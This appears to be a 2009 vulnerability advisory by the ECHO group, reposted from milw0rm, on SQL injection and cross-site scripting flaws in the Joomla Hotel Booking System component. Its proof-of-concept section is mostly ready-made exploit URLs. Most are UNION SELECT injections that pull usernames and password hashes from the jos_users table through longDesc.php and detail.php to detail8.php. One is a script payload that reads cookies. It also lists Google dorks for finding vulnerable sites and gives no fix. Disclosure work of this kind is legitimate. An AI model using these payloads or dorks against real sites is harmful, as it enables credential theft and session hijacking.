@@ -1,0 +1,125 @@
+____________________   ___ ___ ________
+\_   _____/\_   ___ \ /   |   \\_____  \  
+ |    __)_ /    \  \//    ~    \/   |   \ 
+ |        \\     \___\    Y    /    |    \
+/_______  / \______  /\___|_  /\_______  /
+        \/         \/       \/         \/ 
+
+                                        .OR.ID
+ECHO_ADV_111$2009
+
+-----------------------------------------------------------------------------------------
+[ECHO_ADV_111$2009] Joomla Hotel Booking System Component XSS/SQL Injection Multiple Vulnerability
+-----------------------------------------------------------------------------------------
+
+Author       : K-159
+Date         : September, 11 th 2009
+Location     : Jakarta, Indonesia
+Web          : http://e-rdc.org/v1/news.php?readmore=142
+Critical Lvl : Moderate
+Impact       : Exposure of sensitive information
+Where        : From Remote
+---------------------------------------------------------------------------
+
+Affected software description:
+~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+Application : Joomla Hotel Booking System
+version     : Hotel Booking System Package I,II,III
+Vendor      : http://www.joomlahbs.com
+Description :
+
+Joomla HBS (Joomla Hotel Booking System) was designed to simplify the task of online booking in Joomla Content Management Website. 
+It provides users a unique, intuitive and easy to use interface that improves the way people use the web today.
+Joomla Hotel Booking System (Joomla HBS) enhances the entire Hotel Booking web experience in Joomla!. 
+Its Flexible, Simple, Elegant, Customizable and Powerful. Joomla HBS Easy to install, simple to manage and reliable.
+
+Joomla Hotel Booking / Reservation System to be used together with a Content Management System (CMS) called Joomla!.
+Joomla and Joomla HBS are written in PHP and made for easy use in a PHP / MySQL environment.
+
+--------------------------------------------------------------------------
+
+Vulnerability:
+~~~~~~~~~~~~
+I.SQL injection
+
+1). Input passed via the "h_id" & "id" parameter in longDesc.php are not properly sanitised before being used in SQL queries.
+This can be exploited to manipulate SQL queries by injecting arbitrary SQL code.HBS Package III only
+
+1). Input passed via the "rid" parameter in longDesc.php is not properly sanitised before being used in SQL queries.
+This can be exploited to manipulate SQL queries by injecting arbitrary SQL code.HBS Package I,II only.
+
+2). Input passed via the "h_id" parameter in detail.php, detail1.php, detail2.php, detail3.php, detail4.php, detail5.php, detail6.php, detail7.php,
+& detail8.php is not properly sanitised before being used in SQL queries.This can be exploited to manipulate SQL queries by injecting arbitrary SQL code.
+HBS Package I,II,III.
+
+Poc/Exploit:
+~~~~~~~
+
+http://www.example.com/components/com_hbssearch/longDesc.php?h_id=1&id=-2%20union%20select%20concat%28username,0x3a,password%29%20from%20jos_users--
+http://www.example.com/components/com_hbssearch/longDesc.php?h_id=-1%20union%20select%20concat%28username,0x3a,password%29%20from%20jos_users--&id=2
+http://www.example.com/components/com_hbssearch/longDesc.php?hid=5&rid=-32%20union%20select%20concat%28username,0x3a,password%29%20from%20jos_users--
+http://www.example.com/components/com_hbssearch/detail.php?h_id=-5%20union%20select%201,2,3,4,5,6,7,concat%28username,0x3a,password%29,9,0,1,2,3,4,5,6,7,8,9,0,1,2,3,4,5,6,7,8,9,0,1,2,3,4,5,6,7,8,9,0,1,2,3,4,5,6,7,8,9,0,1,2,3,4,5,6,7,8,9,0,1,2,3%20from%20jos_users--
+http://www.example.com/components/com_hbssearch/detail1.php?h_id=-5%20union%20select%20concat%28username,0x3a,password%29%20from%20jos_users--
+http://www.example.com/components/com_hbssearch/detail2.php?h_id=-5%20union%20select%20concat%28username,0x3a,password%29%20from%20jos_users--
+http://www.example.com/components/com_hbssearch/detail3.php?h_id=-5%20union%20select%20concat%28username,0x3a,password%29%20from%20jos_users--
+http://www.example.com/components/com_hbssearch/detail4.php?h_id=-5%20union%20select%20concat%28username,0x3a,password%29%20from%20jos_users--
+http://www.example.com/components/com_hbssearch/detail5.php?h_id=-5%20union%20select%20concat%28username,0x3a,password%29%20from%20jos_users--
+http://www.example.com/components/com_hbssearch/detail6.php?h_id=-5%20union%20select%20concat%28username,0x3a,password%29%20from%20jos_users--
+http://www.example.com/components/com_hbssearch/detail7.php?h_id=-1%20union%20select%201,2,3,concat%28username,0x3a,password%29,5%20from%20jos_users--
+http://www.example.com/components/com_hbssearch/detail8.php?h_id=-5%20union%20select%201,concat%28username,0x3a,password%29,3,4%20from%20jos_users--
+
+
+II.Xss/Cross Site Scripting
+
+Input passed via the "adult" parameter in index.php when option set to com_hbssearch & task set to showhoteldetails is not properly sanitised before being used
+This can be exploited to insert arbitrary HTML or javascript in a user's browser.an attacker can use this vulnerability to stole cookies or sessionid from users
+in context of an affected site.
+
+PoC/Exploit :
+~~~~~~~~~~
+http://www.example.com/index.php?option=com_hbssearch&task=showhoteldetails&id=118&adult=2<script>alert(document.cookie);</script>&child=0&r_type=1&chkin=2009-09-15&chkout=2009-09-16&datedif=1&str_day=Tue&end_day=Wed&start_day=Tue&star=
+
+
+Dork:
+~~~
+Google : "option=com_tophotelmodule","option=com_lowcosthotels","option=com_allhotels","option=com_5starhotels","option=com_hbssearch"
+
+
+Solution:
+~~~~~
+- N/A.
+
+Timeline:
+~~~~~~~
+
+- 31 - 08 - 2009 bug found
+- 03 - 09 - 2009 vendor contacted and response
+- 11 - 09 - 2009 advisory release
+---------------------------------------------------------------------------
+
+Shoutz:
+~~~
+~ "Happy 6 th Anniversary for ECHO, keep the good work!"
+~ ping - my dearest wife, zizau - my beloved son, i-eyes - my beloved daughter.
+~ y3dips,the_day,Negatif,lirva32 (congratz for the new baby),pushm0v,az001,rey,the_hydra,neng chika,comex, str0ke
+~ comitte [at] 2009.idsecconf.org
+~ scanners [at] SCAN-NUSANTARA & SCAN-ASSOCIATES
+~ SK,Abond,pokley,cybertank,super_temon,whatsoever,b120t0,inggar,fachri,adi,rahmat,indrawayank,mukadarah
+~ masterpop3,maSter-oP,Lieur-Euy,Mr_ny3m,bithedz,murp,sakitjiwa,x16,cyb3rh3b,cR4SH3R,ogeb,bagan,devsheed
+~ dr188le,cow_1seng,poniman_coy,paman_gembul,ketut,rizal,ghostblup,shamus,kuntua, stev_manado,nofry,k1tk4t,0pt1c
+~ all the crew [at] UPN Veteran Jogja & Palcomtech Palembang
+~ newbie_hacker [at] yahoogroups.com
+~ milw0rm.com, 2009.idsecconf.org, unitiga.com, mac.web.id, indowebster.com
+~ #aikmel #e-c-h-o @irc.dal.net
+
+---------------------------------------------------------------------------
+Contact:
+~~~~
+
+K-159 || echo|staff || adv[at]e-rdc[dot]org
+Homepage: http://www.e-rdc.org/
+
+-------------------------------- [ EOF ] ---------------------------------- 
+
+# milw0rm.com [2009-09-11]
